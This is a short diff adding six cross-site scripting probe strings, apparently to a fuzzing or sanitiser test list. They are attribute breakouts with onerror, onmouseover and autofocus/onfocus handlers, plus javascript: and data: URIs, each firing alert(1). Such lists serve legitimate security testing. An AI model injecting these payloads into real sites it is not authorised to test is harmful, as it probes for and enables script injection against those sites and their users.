@@ -1,0 +1,6 @@
+" onerror="alert(1)
+' onmouseover='alert(1)
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+" autofocus onfocus="alert(1)
+' autofocus onfocus='alert(1)
